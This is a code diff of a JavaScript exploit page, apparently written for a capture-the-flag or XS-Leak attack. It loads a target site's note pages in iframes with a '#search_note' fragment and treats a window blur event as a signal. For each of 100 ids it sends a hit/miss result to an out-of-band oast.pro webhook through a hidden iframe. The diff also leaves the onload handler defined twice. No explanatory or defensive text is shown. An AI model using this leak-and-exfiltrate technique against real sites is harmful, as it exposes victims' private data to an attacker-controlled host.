@@ -5,23 +5,42 @@ const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
 const urlParams = new URLSearchParams(window.location.search);
 const startId = parseInt(urlParams.get('id'), 10) || 1;
 
-function testId(id) {
+function testId(id, timeout = 3000) {
     return new Promise((resolve) => {
-        let blurFired = false;
-        window.addEventListener("blur", () => { blurFired = true; });
+        let done = false;
+
         const iframe = document.createElement("iframe");
         iframe.src = TARGET + id + "#search_note";
-        document.body.appendChild(iframe);
-        setTimeout(() => {
-            const result = blurFired ? "hit" : "miss";
+
+        const cleanup = (result) => {
+            if (done) return;
+            done = true;
+            window.removeEventListener("blur", onBlur);
+            iframe.remove();
+
             const ex = document.createElement("iframe");
             ex.style.display = "none";
             ex.src = WEBHOOK + "?result=" + result + "&id=" + id;
             document.body.appendChild(ex);
-            resolve();
-        }, 1000);
+
+            resolve(result);
+        };
+
+        const onBlur = () => cleanup("hit");
+
+        window.addEventListener("blur", onBlur, { once: true });
+        document.body.appendChild(iframe);
+
+        setTimeout(() => cleanup("miss"), timeout);
     });
 }
+
+window.onload = async function () {
+    for (let i = 0; i < 100; i++) {
+        await testId(startId + i);
+    }
+};
+
 
 window.onload = async function() {
     for (let i = 0; i < 100; i++) {
